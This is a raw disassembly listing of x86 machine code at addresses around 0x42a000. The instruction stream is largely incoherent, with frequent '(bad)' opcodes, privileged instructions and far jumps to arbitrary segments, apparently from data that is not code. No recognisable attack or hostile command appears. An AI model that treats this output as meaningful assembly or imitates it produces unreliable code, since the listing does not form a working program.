  429fb1:	sbb    dl,BYTE PTR [edi+0x8]
  429fb4:	dec    ebx
  429fb5:	pop    ss
  429fb6:	ins    DWORD PTR es:[edi],dx
  429fb7:	xor    al,0xf
  429fb9:	jmp    0x97d2:0x40b107c7
  429fc0:	xor    eax,0xbf722d7b
  429fc5:	mov    ch,0xe8
  429fc7:	sbb    BYTE PTR [eax],dl
  429fc9:	ja     0x42a025
  429fcb:	stos   BYTE PTR es:[edi],al
  429fcc:	data16 jg 0x42a029
  429fcf:	add    eax,0x14bc8d57
  429fd4:	jecxz  0x42a008
  429fd6:	imul   edx,edx,0x6f88d34f
  429fdc:	sub    al,0x83
  429fde:	pop    edi
  429fdf:	cdq    
  429fe0:	hlt    
  429fe1:	sti    
  429fe2:	push   eax
  429fe3:	in     al,dx
  429fe4:	mov    ebp,0xa53d2711
  429fe9:	and    bl,BYTE PTR [eax+0x76ad5a0e]
  429fef:	lea    esi,[edi+0x4b68ea74]
  429ff5:	xchg   DWORD PTR [ebx-0x20aa936c],edi
  429ffb:	mov    DWORD PTR [ebp-0x2b],esp
  429ffe:	loop   0x429fd9
  42a000:	fimul  DWORD PTR [eax+0x70d2ec9c]
  42a006:	pop    ecx
  42a007:	sti    
  42a008:	cmc    
  42a009:	sub    al,0xe4
  42a00b:	lar    edx,WORD PTR [edx-0x679ac0a7]
  42a012:	adc    eax,0xe4ad7ff1
  42a017:	icebp  
  42a018:	cmp    dh,BYTE PTR [ebp-0x1b]
  42a01b:	sub    DWORD PTR [edi],eax
  42a01d:	mov    bh,BYTE PTR ds:0xa7a9315d
  42a023:	dec    esi
  42a024:	jb     0x42a02c
  42a026:	imul   BYTE PTR [edi-0x58]
  42a029:	scas   al,BYTE PTR es:[edi]
  42a02a:	jmp    0x429fde
  42a02c:	hlt    
  42a02d:	jl     0x42a027
  42a02f:	test   BYTE PTR [edx-0x465ecade],bh
  42a035:	stos   BYTE PTR es:[edi],al
  42a036:	dec    esi
  42a037:	cmc    
  42a038:	ficomp DWORD PTR [edx+0x55e8ef6c]
  42a03e:	popa   
  42a03f:	ins    DWORD PTR es:[edi],dx
  42a040:	test   DWORD PTR [edx],esi
  42a042:	fwait
  42a043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a044:	out    dx,al
  42a045:	ret    
  42a046:	lock mov BYTE PTR [edx+0x22e8f854],dh
  42a04d:	sahf   
  42a04e:	xchg   al,dh
  42a050:	shr    BYTE PTR [ebp-0x70d5e99f],cl
  42a056:	or     eax,0xe159b1f1
  42a05b:	pusha  
  42a05c:	dec    esi
  42a05d:	hlt    
  42a05e:	fdivr  st(0),st
  42a060:	sub    esi,edi
  42a062:	cdq    
  42a063:	std    
  42a064:	stos   BYTE PTR es:[edi],al
  42a065:	inc    esp
  42a066:	mov    edx,0x51e0ab14
  42a06b:	repz xchg edx,eax
  42a06d:	in     eax,0x74
  42a06f:	push   ebx
  42a070:	ret    0xa695
  42a073:	loop   0x429ff8
  42a075:	call   0xc944:0x5cb77f56
  42a07c:	mov    eax,0x88d8b5cd
  42a081:	jmp    0x4c5e:0xa7e7bcb8
  42a088:	enter  0xcaab,0x51
  42a08c:	loopne 0x42a010
  42a08e:	push   esi
  42a08f:	imul   eax,DWORD PTR [eax],0x0
	...
  42a0f2:	add    BYTE PTR [eax],al
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	cmp    esi,ebp
  42a102:	and    ebp,DWORD PTR [edx-0x74]
  42a105:	rol    DWORD PTR [ecx],0x0
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	lods   al,BYTE PTR ds:[esi]
  42a10d:	xlat   BYTE PTR ds:[ebx]
  42a10e:	sub    bh,dl
  42a110:	outs   dx,DWORD PTR ds:[esi]
  42a111:	push   0x21febfd4
  42a116:	pop    ecx
  42a117:	xlat   BYTE PTR ds:[ebx]
  42a118:	fdivr  QWORD PTR [edx]
  42a11a:	(bad)  
  42a11b:	fadd   DWORD PTR [ecx-0x156e57fa]
  42a121:	lfs    edx,FWORD PTR [edx]
  42a124:	jecxz  0x42a11b
  42a126:	dec    edi
  42a127:	test   edx,0xd3d99117
  42a12d:	jns    0x42a193
  42a12f:	and    esp,DWORD PTR [ebx+ebp*4]
  42a132:	mov    tr6,eax
  42a135:	mov    bh,0xc1
  42a137:	or     DWORD PTR [ecx+0x23c7278e],edi
  42a13d:	retf   
  42a13e:	jns    0x42a0eb
  42a140:	shr    BYTE PTR [ebp-0x74fa3e84],cl
  42a146:	stos   BYTE PTR es:[edi],al
  42a147:	jns    0x42a1a9
  42a149:	popf   
  42a14a:	test   DWORD PTR [esi+0x72e48213],ebx
  42a150:	pop    ebp
  42a151:	dec    ebp
  42a152:	or     eax,DWORD PTR [eax+0x3f]
  42a155:	and    eax,0x8d86a8c5
  42a15a:	mov    edi,0xb272aedb
  42a15f:	inc    esi
  42a160:	mov    edi,0x9394ca00
  42a165:	daa    
  42a166:	(bad)  [esi+ebx*1-0x574b5d1]
  42a16d:	(bad)  
  42a16f:	jp     0x42a1da
  42a171:	test   DWORD PTR ss:[edi-0x23],ebp
  42a175:	lds    esp,FWORD PTR [ecx-0x58f7b854]
  42a17b:	dec    ebx
  42a17c:	retf   
  42a17d:	repz scas eax,DWORD PTR es:[edi]
  42a17f:	mov    ebx,0x6b332b27
  42a184:	add    bh,BYTE PTR [ecx+ecx*4-0x9dde174]
  42a18b:	sti    
  42a18c:	pop    edi
  42a18d:	idiv   cl
  42a18f:	enter  0x9553,0xd5
  42a193:	add    edi,DWORD PTR [esp+esi*2]
  42a196:	pusha  
  42a197:	jnp    0x42a142
  42a199:	fldlg2 
  42a19b:	sbb    dh,BYTE PTR [edi-0x57]
  42a19e:	and    al,0x18
  42a1a0:	lock mov dl,0xd
  42a1a3:	mov    WORD PTR [esi],cs
  42a1a5:	inc    edx
  42a1a6:	mov    bh,0x4b
  42a1a8:	sub    dl,cl
  42a1aa:	push   ebx
  42a1ab:	add    DWORD PTR es:[ebp+esi*2-0x73],esi
  42a1b0:	mov    BYTE PTR [ebx+ebx*4],dl
  42a1b3:	push   esp
  42a1b4:	push   ebp
  42a1b5:	js     0x42a169
  42a1b7:	xor    al,0xec
  42a1b9:	mov    dh,BYTE PTR ds:0xbd99dd5c
  42a1bf:	inc    eax
  42a1c0:	lea    esp,[edi-0x6c]
  42a1c3:	out    0x9d,eax
  42a1c5:	outs   dx,DWORD PTR ds:[esi]
  42a1c6:	adc    bl,ch
  42a1c8:	gs leave 
  42a1ca:	and    al,0x6f
  42a1cc:	int    0x30
  42a1ce:	fmulp  st(5),st
  42a1d0:	in     al,0x3f
  42a1d2:	mov    dh,0x3b
  42a1d4:	loopne 0x42a24d
  42a1d6:	dec    edx
  42a1d7:	add    DWORD PTR [esi],edx
  42a1d9:	pop    ebx
  42a1da:	mov    esp,0xdca58ecc
  42a1df:	fisttp QWORD PTR [eax-0x79876e72]
  42a1e5:	dec    ebp
  42a1e6:	iret   
  42a1e7:	std    
  42a1e8:	push   ss
  42a1e9:	jl     0x42a254
  42a1eb:	and    BYTE PTR [eax-0x50],0x0
  42a1ef:	inc    ebx
  42a1f0:	loop   0x42a1aa
  42a1f2:	dec    esp
  42a1f3:	xor    ch,BYTE PTR [esp+ebp*8+0x3b]
  42a1f7:	cs dec ebx
  42a1f9:	xchg   edi,eax
  42a1fa:	mov    al,0x87
  42a1fc:	push   cs
  42a1fd:	cld    
  42a1fe:	or     DWORD PTR [ecx],ebx
  42a200:	add    BYTE PTR [ecx+0x5a],ch
  42a203:	mov    eax,esi
  42a205:	je     0x42a1f8
  42a207:	jnp    0x42a269
  42a209:	mov    BYTE PTR [esi-0x6a],cl
  42a20c:	dec    edi
  42a20d:	pop    ebx
  42a20e:	sti    
  42a20f:	cld    
	...
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldl2t 
  42a281:	(bad)  [edi-0x1b]
  42a284:	nop
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	xchg   ebx,eax
  42a28d:	test   DWORD PTR [esi+ebp*8-0x4bad6165],eax
  42a294:	(bad)  
  42a295:	int3   
  42a296:	cld    
  42a297:	mov    dl,0xce
  42a299:	push   ebx
  42a29a:	xchg   edx,eax
  42a29b:	in     al,0x17
  42a29d:	pop    esp
  42a29e:	mov    ch,0x24
  42a2a0:	stos   BYTE PTR es:[edi],al
  42a2a1:	outs   dx,BYTE PTR ds:[esi]
  42a2a2:	call   0x9740:0x3c16cce6
  42a2a9:	gs stos BYTE PTR es:[edi],al
  42a2ab:	mov    esp,0x7f6d44ca
  42a2b0:	cli    
  42a2b1:	cmp    DWORD PTR [edi+0x1a48c223],edi
  42a2b7:	lahf   
  42a2b8:	cmp    al,0xa6
  42a2ba:	jmp    0xf79e:0x83f5fbc2
  42a2c1:	xchg   edi,eax
  42a2c2:	loopne 0x42a328
  42a2c4:	aas    
  42a2c5:	pop    ecx
  42a2c6:	fst    st(7)
  42a2c8:	adc    BYTE PTR [ebp+0x7d],dl
  42a2cb:	mov    eax,0xaed350bc
  42a2d0:	pop    ecx
  42a2d1:	fst    QWORD PTR [ebx+0x1]
  42a2d4:	cmp    esi,DWORD PTR [esi]
  42a2d6:	repz ficomp WORD PTR [ebx+eax*4-0x2a]
  42a2db:	jnp    0x42a35a
  42a2dd:	xchg   esp,eax
  42a2de:	push   esi
  42a2df:	xchg   ebp,eax
  42a2e0:	inc    edx
  42a2e1:	mov    bh,0x2f
  42a2e3:	ins    BYTE PTR es:[edi],dx
  42a2e4:	cmp    eax,0x7c1424d6
  42a2e9:	jle    0x42a35f
  42a2eb:	mov    edi,0x82c0444b
  42a2f0:	adc    al,BYTE PTR [ebx]
  42a2f2:	sub    cl,BYTE PTR [edi+0x5f42ee41]
  42a2f8:	ins    DWORD PTR es:[edi],dx
  42a2f9:	dec    esi
  42a2fa:	cld    
  42a2fb:	jg     0x42a294
  42a2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2fe:	(bad)  
  42a300:	cwde   
  42a301:	add    DWORD PTR ds:0xc4fc2d9d,ecx
  42a307:	xor    al,0x10
  42a309:	and    esp,DWORD PTR [ebx]
  42a30b:	xchg   DWORD PTR [eax],eax
  42a30d:	adc    ax,0x5d60
  42a311:	jmp    0x42a301
  42a313:	pushf  
  42a314:	xor    DWORD PTR [edx+0x45],esi
  42a317:	shl    DWORD PTR [edi+0x9],0x54
  42a31b:	test   eax,0xee112f40
  42a320:	mov    eax,0xd680e20
  42a325:	daa    
  42a326:	jnp    0x42a2cc
  42a328:	lock sub ch,al
  42a32b:	leave  
  42a32c:	scas   al,BYTE PTR es:[edi]
  42a32d:	inc    esi
  42a32e:	lahf   
  42a32f:	mov    bh,0x3c
  42a331:	jp     0x42a376
  42a333:	push   eax
  42a334:	adc    BYTE PTR [ecx],dh
  42a336:	mov    edx,0xef84cbe7
  42a33b:	push   es
  42a33c:	lds    ebp,FWORD PTR [edx+0x64]
  42a33f:	cmp    eax,0xcb913fe6
  42a344:	scas   al,BYTE PTR es:[edi]
  42a345:	(bad)  
  42a346:	cmp    eax,0x58f9ca07
  42a34b:	cmp    ecx,ebp
  42a34d:	test   DWORD PTR [ebp+0x22d0ea28],0xdd85acf
  42a357:	adc    edx,DWORD PTR [esi-0x3bb6c35d]
  42a35d:	sahf   
  42a35e:	jbe    0x42a328
  42a360:	clc    
  42a361:	iret   
  42a362:	dec    eax
  42a363:	jmp    FWORD PTR [edi+0x2d]
  42a366:	xchg   edx,eax
  42a367:	cmp    eax,0xf2ccfda0
  42a36c:	jae    0x42a3d1
  42a36e:	aam    0xe8
  42a370:	ins    BYTE PTR es:[edi],dx
  42a371:	lahf   
  42a372:	mov    esp,0x2dad2aae
  42a377:	jmp    0x42a36f
  42a379:	pop    edi
  42a37a:	dec    eax
  42a37b:	dec    esp
  42a37c:	mov    edx,0xe0a1d81c
  42a381:	ret    
  42a382:	push   es
  42a383:	stos   DWORD PTR es:[edi],eax
  42a384:	pop    esi
  42a385:	sbb    cl,bh
  42a387:	add    eax,0xf4a81291
  42a38c:	sub    bl,ah
  42a38e:	sub    esp,DWORD PTR [ebx+0x0]
	...
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xd482733d
  42a403:	not    BYTE PTR [ebx+eax*8+0x1040001]
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	inc    esp
  42a40d:	jle    0x42a391
  42a40f:	imul   esi,DWORD PTR [edx],0x43210586
  42a415:	jmp    0x10f1:0x37603ee2
  42a41c:	mov    bh,ch
  42a41e:	loopne 0x42a48a
  42a420:	pop    ebx
  42a421:	adc    BYTE PTR [ebp+0x4a],cl
  42a424:	mov    esi,0x5c4958eb
  42a429:	sbb    eax,0xa6b4a03f
  42a42e:	stc    
  42a42f:	or     eax,0x90a2c56a
  42a434:	(bad)  
  42a435:	stos   BYTE PTR es:[edi],al
  42a436:	arpl   WORD PTR [ebx-0x790c17ca],bx
  42a43c:	fdivrp st(1),st
  42a43e:	into   
  42a43f:	add    eax,0x15dc6725
  42a444:	fucomi st,st(6)
  42a446:	fsubrp st(3),st
  42a448:	sub    DWORD PTR [ebx],esp
  42a44a:	sbb    BYTE PTR ds:0xb2de23a4,dh
  42a450:	xchg   BYTE PTR [edi+0x2476c8c6],dl
  42a456:	pop    ss
  42a457:	xchg   DWORD PTR [ebx+0xf],ebx
  42a45a:	jns    0x42a3dc
  42a45c:	adc    ah,BYTE PTR [edi+0x16]
  42a45f:	adc    BYTE PTR [ebp-0x5cb6e496],0xaa
  42a466:	mov    al,0x84
  42a468:	ror    DWORD PTR [ecx-0x40],0xaa
  42a46c:	lods   al,BYTE PTR ds:[esi]
  42a46d:	iret   
  42a46e:	xchg   DWORD PTR [ecx],edi
  42a470:	mov    ds:0x99cc4631,eax
  42a475:	je     0x42a4f6
  42a477:	pop    esp
  42a478:	test   DWORD PTR [ebx],esp
  42a47a:	push   es
  42a47b:	mov    edx,edx
  42a47d:	lea    eax,[edi]
  42a47f:	pop    es
  42a480:	retf   0xa139
  42a483:	clc    
  42a484:	int    0xe2
  42a486:	mov    bh,0xe1
  42a488:	dec    ebx
  42a489:	or     DWORD PTR [eax-0x3f],eax
  42a48c:	or     BYTE PTR [eax+0x4213dc3f],0xc8
  42a493:	mov    al,0x51
  42a495:	or     eax,0x121ac6b
  42a49a:	push   esi
  42a49b:	xor    DWORD PTR [edi+eax*1],ebp
  42a49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a49f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4a0:	xor    al,BYTE PTR [ebx-0x5d]
  42a4a3:	test   DWORD PTR [edx],edx
  42a4a5:	das    
  42a4a6:	jo     0x42a43d
  42a4a8:	cwde   
  42a4a9:	scas   eax,DWORD PTR es:[edi]
  42a4aa:	jle    0x42a43e
  42a4ac:	pop    ds
  42a4ad:	or     eax,0x5d79b32a
  42a4b2:	test   eax,0xd5e6b9f5
  42a4b7:	sub    bl,BYTE PTR [eax+0x69]
  42a4ba:	or     al,0x2
  42a4bc:	jo     0x42a4cd
  42a4be:	in     eax,0x58
  42a4c0:	imul   ecx,DWORD PTR [edi-0x30635ae9],0x92929852
  42a4ca:	xchg   edi,eax
  42a4cb:	js     0x42a463
  42a4cd:	inc    esi
  42a4ce:	push   ss
  42a4cf:	ins    BYTE PTR es:[edi],dx
  42a4d0:	cmc    
  42a4d1:	(bad)  
  42a4d2:	es dec eax
  42a4d4:	mov    eax,ds:0x473a75bf
  42a4d9:	int3   
  42a4da:	jl     0x42a4db
  42a4dc:	test   al,0x50
  42a4de:	or     esi,DWORD PTR [ecx-0x6f5cd0cb]
  42a4e4:	xchg   esp,eax
  42a4e5:	in     eax,0x9
  42a4e7:	or     al,0x33
  42a4e9:	call   0xac81:0xe88ec62
  42a4f0:	(bad)  
  42a4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4f2:	jl     0x42a4bc
  42a4f4:	add    dh,0x18
  42a4f7:	push   ebx
  42a4f8:	out    0x41,eax
  42a4fa:	ja     0x42a4e7
  42a4fc:	pusha  
  42a4fd:	fild   DWORD PTR [edi+0x3b]
  42a500:	jge    0x42a528
  42a502:	sub    al,0xdc
  42a504:	aam    0xd7
  42a506:	call   0xfd68f719
  42a50b:	adc    al,0xc8
  42a50d:	mov    ds:0xfcb3,eax
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x6b95bc9f
  42a583:	jo     0x42a51d
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	out    0xfb,al
  42a58e:	fisttp DWORD PTR [eax+0x71]
  42a591:	and    DWORD PTR [eax+edi*8],edx
  42a594:	or     DWORD PTR [edx-0x689a3be8],edi
  42a59a:	push   edx
  42a59b:	bound  eax,QWORD PTR [edx]
  42a59d:	cmp    al,0x25
  42a59f:	pop    edi
  42a5a0:	push   esp
  42a5a1:	js     0x42a5bd
  42a5a3:	imul   esi,ecx,0x272c9823
  42a5a9:	cmp    eax,0x3b2277cb
  42a5ae:	imul   esp,DWORD PTR [ebp+esi*8+0x60],0xfffffff7
  42a5b3:	push   esi
  42a5b4:	js     0x42a629
  42a5b6:	ficom  WORD PTR [ebx-0x4b]
  42a5b9:	inc    edx
  42a5ba:	arpl   ax,sp
  42a5bc:	(bad)  
  42a5bd:	pop    edx
  42a5be:	dec    edi
  42a5bf:	sbb    bh,bl
  42a5c1:	mov    ebp,0xe5c0d6b4
  42a5c6:	jbe    0x42a615
  42a5c8:	and    al,0x8b
  42a5ca:	cwde   
  42a5cb:	adc    eax,0x362dc553
  42a5d0:	sar    BYTE PTR [edi-0x8e0d0d4],1
  42a5d6:	iret   
  42a5d7:	xchg   dh,bl
  42a5d9:	or     esp,DWORD PTR [ebp+esi*8-0x412c5ffe]
  42a5e0:	push   es
  42a5e1:	push   ebx
  42a5e2:	loope  0x42a5a3
  42a5e4:	test   DWORD PTR [edx+0x11a00450],eax
  42a5ea:	mov    esi,0xe84f539f
  42a5ef:	(bad)  
  42a5f0:	jne    0x42a5a1
  42a5f2:	lock pop ebx
  42a5f4:	call   0xa847263
  42a5f9:	test   ax,0x768f
  42a5fd:	push   0x6336cdb9
  42a602:	push   ss
  42a603:	retf   
  42a604:	test   eax,0x96d31061
  42a609:	cmc    
  42a60a:	xlat   BYTE PTR ds:[ebx]
  42a60b:	pop    edi
  42a60c:	sbb    ch,BYTE PTR [ebx+0x5beeb93f]
  42a612:	imul   esp,DWORD PTR [esi-0x2ebcb02d],0x66
  42a619:	push   es
  42a61a:	aam    0x40
  42a61c:	mov    cl,0xeb
  42a61e:	ins    BYTE PTR es:[edi],dx
  42a61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a620:	xlat   BYTE PTR ds:[ebx]
  42a621:	cmp    eax,0xe45bf1c9
  42a626:	daa    
  42a627:	fcomp  st(7)
  42a629:	iret   
  42a62a:	in     eax,dx
  42a62b:	mov    esp,0x3a1cfdb7
  42a630:	jne    0x42a631
  42a632:	ins    DWORD PTR es:[edi],dx
  42a633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a634:	icebp  
  42a635:	(bad)  
  42a636:	ss ja  0x42a5dc
  42a639:	fdivr  DWORD PTR [ebp-0x2e15cedc]
  42a63f:	(bad)  
  42a640:	mov    dl,0xcd
  42a642:	mov    ecx,0xb3a000c8
  42a647:	jbe    0x42a684
  42a649:	rcr    BYTE PTR [edi],cl
  42a64b:	(bad)  
  42a64c:	int3   
  42a64d:	jp     0x42a601
  42a64f:	sbb    eax,0x274f69c
  42a654:	or     DWORD PTR [ecx],esp
  42a656:	ror    DWORD PTR [edi],1
  42a658:	pop    edi
  42a659:	sbb    BYTE PTR [esp+ebx*1],al
  42a65c:	stos   WORD PTR es:[edi],ax
  42a65e:	mov    ch,0xa8
  42a660:	fild   QWORD PTR [ebp*4+0x35a83610]
  42a667:	and    DWORD PTR [eax+0x6c],esp
  42a66a:	jae    0x42a6b5
  42a66c:	int    0x1d
  42a66e:	mov    eax,ds:0x4b7266cf
  42a673:	mov    bl,0xe2
  42a675:	adc    BYTE PTR [ebp-0x2e],al
  42a678:	test   al,0x95
  42a67a:	lods   eax,DWORD PTR ds:[si]
  42a67c:	outs   dx,DWORD PTR ds:[esi]
  42a67d:	mov    esi,0x332dbaf1
  42a682:	sahf   
  42a683:	push   ss
  42a684:	cmp    ch,BYTE PTR [edx+0x33e2bdc4]
  42a68a:	add    edi,ebx
  42a68c:	and    BYTE PTR [edx+0x1eb],al
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x18b8131c],0x9cdae6ec
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	adc    BYTE PTR [ebp+0x5f8ac0f8],cl
  42a712:	mov    ah,0xd9
  42a714:	lods   eax,DWORD PTR ds:[esi]
  42a715:	jecxz  0x42a6c7
  42a717:	xchg   edi,eax
  42a718:	cmp    ah,bh
  42a71a:	fisub  DWORD PTR [edi+0x63d551ae]
  42a720:	pop    esp
  42a721:	fdiv   st,st(7)
  42a723:	daa    
  42a724:	sbb    BYTE PTR [ecx-0x2210130],cl
  42a72a:	stos   DWORD PTR es:[edi],eax
  42a72b:	push   ds
  42a72c:	sbb    al,0x53
  42a72e:	mov    BYTE PTR [ebx-0x348d6998],bh
  42a734:	add    DWORD PTR [ebx+0x1a1a4f8a],edx
  42a73a:	aas    
  42a73b:	(bad)  [eax+0x2b314351]
  42a741:	pop    ds
  42a742:	fisubr DWORD PTR [esi-0x1d3f87]
  42a748:	retf   
  42a749:	push   ds
  42a74a:	and    al,0xa9
  42a74c:	or     DWORD PTR [edx],ebx
  42a74e:	inc    edi
  42a74f:	data16 mov WORD PTR [edi+edi*4-0x60],gs
  42a754:	dec    esp
  42a755:	or     BYTE PTR [ecx+0xe327fc9],al
  42a75b:	aas    
  42a75c:	pop    ebp
  42a75d:	ss sub al,0xae
  42a760:	cmp    eax,DWORD PTR [edi+esi*2-0x21cdc775]
  42a767:	jae    0x42a7b5
  42a769:	sub    edx,DWORD PTR [eax-0x2d]
  42a76c:	loope  0x42a794
  42a76e:	pop    ebp
  42a76f:	xchg   BYTE PTR [ebx+0x50c4a6e],dh
  42a775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a776:	jno    0x42a788
  42a778:	test   eax,0x90cfc226
  42a77d:	pop    ds
  42a77e:	mov    bl,0xfd
  42a780:	idiv   BYTE PTR [edx+0x35]
  42a783:	push   ecx
  42a784:	push   edi
  42a785:	jbe    0x42a7bd
  42a787:	sbb    ebx,DWORD PTR [eax-0x2]
  42a78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a78b:	mov    al,0xec
  42a78d:	(bad)  
  42a78e:	scas   eax,DWORD PTR es:[edi]
  42a78f:	fld    QWORD PTR [ecx+0x7454b5ec]
  42a795:	or     al,0xb0
  42a797:	fs ret 
  42a799:	into   
  42a79a:	rcl    DWORD PTR [edx-0x1f],0xb9
  42a79e:	push   edx
  42a79f:	nop
  42a7a0:	jnp    0x42a7a6
  42a7a2:	(bad)  
  42a7a3:	fwait
  42a7a4:	into   
  42a7a5:	push   edi
  42a7a6:	int3   
  42a7a7:	dec    ecx
  42a7a8:	iret   
  42a7a9:	pop    ecx
  42a7aa:	xchg   BYTE PTR [ecx+0x2f376dd7],bl
  42a7b0:	mov    ds:0x749bcc77,eax
  42a7b5:	out    dx,al
  42a7b6:	adc    eax,0x50706681
  42a7bb:	xchg   edi,eax
  42a7bc:	dec    ebp
  42a7bd:	add    ch,cl
  42a7bf:	popf   
  42a7c0:	xchg   DWORD PTR [eax-0x35],ebx
  42a7c3:	sub    bl,BYTE PTR [ecx-0x37]
  42a7c6:	mov    dh,0x85
  42a7c8:	mov    eax,ds:0xf86d3f9f
  42a7cd:	jle    0x42a798
  42a7cf:	ud2    
  42a7d1:	into   
  42a7d2:	add    eax,0xbac9436d
  42a7d7:	dec    edx
  42a7d8:	mov    ds:0xf759ca8c,al
  42a7dd:	leave  
  42a7de:	jae    0x42a825
  42a7e0:	jmp    0xe94c742c
  42a7e5:	and    al,0xce
  42a7e7:	add    eax,0x37270ac3
  42a7ec:	jo     0x42a855
  42a7ee:	ja     0x42a783
  42a7f0:	xchg   edi,eax
  42a7f1:	rcr    DWORD PTR [edx],1
  42a7f3:	xor    DWORD PTR [edx+0x4b3418f0],esp
  42a7f9:	pop    ebp
  42a7fa:	adc    esi,DWORD PTR [eax+0x7c36680c]
  42a800:	cdq    
  42a801:	out    0xd5,eax
  42a803:	out    dx,eax
  42a804:	aas    
  42a805:	in     al,0x49
  42a807:	lea    esi,[ecx+0x71]
  42a80a:	(bad)  
  42a80b:	test   ah,0x6
  42a80e:	rcl    ebp,1
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0xd8d46c97
  42a882:	dec    edx
  42a883:	pop    es
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [ebp+0x4],dl
  42a88e:	enter  0xfc8e,0xdf
  42a892:	push   ebp
  42a893:	add    ecx,DWORD PTR [ecx+0x7b]
  42a896:	in     eax,dx
  42a897:	das    
  42a898:	mov    bp,0xcfd8
  42a89c:	arpl   WORD PTR [ebp-0x118a47b8],si
  42a8a2:	pop    ecx
  42a8a3:	push   ds
  42a8a4:	sbb    edx,0xfffffff6
  42a8a7:	or     eax,0xffffffcc
  42a8aa:	mov    ?,WORD PTR [eax]
  42a8ac:	rdpmc  
  42a8ae:	(bad)  
  42a8af:	jb     0x42a921
  42a8b1:	in     eax,dx
  42a8b2:	cmp    ebp,esi
  42a8b4:	clc    
  42a8b5:	jecxz  0x42a8fb
  42a8b7:	push   ds
  42a8b8:	ret    
  42a8b9:	shl    BYTE PTR [esi+0x40f27ea0],1
  42a8bf:	lods   al,BYTE PTR ds:[esi]
  42a8c0:	adc    eax,0xab47a8b0
  42a8c5:	mov    DWORD PTR [edi-0x23],ebp
  42a8c8:	jo     0x42a8ee
  42a8ca:	sbb    BYTE PTR [esi],dh
  42a8cc:	xchg   esi,eax
  42a8cd:	in     al,dx
  42a8ce:	pop    ebx
  42a8cf:	xchg   ebp,eax
  42a8d0:	in     eax,0x65
  42a8d2:	retf   0xd93
  42a8d5:	jecxz  0x42a91b
  42a8d7:	or     al,BYTE PTR [eax-0x5]
  42a8da:	not    BYTE PTR [esi]
  42a8dc:	(bad)  
  42a8dd:	xor    eax,0x67299c77
  42a8e2:	aas    
  42a8e3:	jle    0x42a8cb
  42a8e5:	add    al,0xf4
  42a8e7:	jo     0x42a921
  42a8e9:	jns    0x42a927
  42a8eb:	es (bad) 
  42a8ee:	cmp    eax,0x50fadc81
  42a8f3:	gs jae 0x42a953
  42a8f6:	inc    esp
  42a8f7:	ds ins BYTE PTR es:[edi],dx
  42a8f9:	popw   es
  42a8fb:	fnstenv [edi-0x5c7660b4]
  42a901:	xchg   ecx,eax
  42a902:	jg     0x42a92a
  42a904:	pop    ebp
  42a905:	fidivr DWORD PTR [edi-0x670860e8]
  42a90b:	js     0x42a95a
  42a90d:	cmc    
  42a90e:	add    al,0x17
  42a910:	in     al,0xfe
  42a912:	arpl   WORD PTR [edi-0x46],si
  42a915:	jo     0x42a8f5
  42a917:	mov    ecx,0x2543ce75
  42a91c:	sbb    cl,0x25
  42a91f:	inc    esp
  42a920:	in     eax,0x52
  42a922:	pop    eax
  42a923:	mov    BYTE PTR [ebx+0x7],0x3e
  42a927:	bound  esi,QWORD PTR [esi-0x11]
  42a92a:	jae    0x42a92c
  42a92c:	add    BYTE PTR [edi],bh
  42a92e:	test   al,0x4b
  42a930:	rol    DWORD PTR [ecx-0xb47982],1
  42a936:	pop    eax
  42a937:	rcl    BYTE PTR [edx-0x58],0x1b
  42a93b:	mov    bh,dh
  42a93d:	add    eax,0x6d9f51f9
  42a942:	scas   eax,DWORD PTR es:[edi]
  42a943:	or     ah,BYTE PTR [edi+ebp*8+0x6c294e2c]
  42a94a:	add    BYTE PTR [edi],al
  42a94c:	es inc esi
  42a94e:	pop    eax
  42a94f:	jnp    0x42a96f
  42a951:	xrelease mov BYTE PTR [esi+0xa],bh
  42a955:	mov    esi,0x53a2a9d7
  42a95a:	xchg   ebx,eax
  42a95b:	jmp    0x42a93c
  42a95d:	test   edi,ebx
  42a95f:	mov    esp,0x4697069e
  42a964:	or     DWORD PTR [edx-0x34],0x1f2fbef5
  42a96b:	xor    al,BYTE PTR [ecx-0x55]
